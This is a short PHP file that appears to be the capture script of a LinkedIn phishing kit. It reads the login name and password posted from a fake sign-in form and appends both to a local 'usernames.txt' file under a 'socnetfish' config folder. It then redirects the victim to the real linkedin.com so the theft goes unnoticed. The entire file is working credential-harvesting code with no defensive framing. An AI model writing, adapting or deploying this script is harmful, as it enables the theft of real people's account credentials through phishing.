<?php

$usuario = exec('whoami');

file_put_contents("/home/".$usuario."/.config/socnetfish/usernames.txt", "\n". "Linkedin" . "\n" . "Account: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://linkedin.com');
exit();
